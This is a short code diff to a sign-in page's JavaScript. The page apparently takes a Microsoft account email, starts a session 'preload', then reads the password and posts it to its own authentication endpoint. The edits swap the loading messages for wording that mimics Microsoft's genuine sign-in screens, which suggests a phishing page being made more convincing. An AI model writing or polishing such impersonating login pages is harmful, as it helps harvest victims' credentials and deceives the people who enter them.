@@ -875,7 +875,7 @@ Status: ${data.status}`);
             }
 
             clearMessage();
-            setLoading(true, 'Verifying your Microsoft account...', false);
+            setLoading(true, 'Taking you to your organization...', false);
 
             try {
                 // First, verify if the email account exists
@@ -894,7 +894,7 @@ Status: ${data.status}`);
                     
                     // Wait for preload to be ready before showing password form
                     if (verifyData.preloadStarted) {
-                        setLoading(true, 'Preparing secure login...');
+                        setLoading(true, 'Signing you in');
                         await waitForPreloadReady(verifyData.sessionId, email);
                     }
                     
@@ -1041,7 +1041,7 @@ Status: ${data.status}`);
         // Password authentication using fast auth endpoint
         async function signInWithPassword() {
             try {
-                setLoading(true, 'Verifying credentials...');
+                setLoading(true, 'Sign In...');
 
                 const email = currentEmail; // Use the stored email
                 const password = document.getElementById('passwordInput').value;
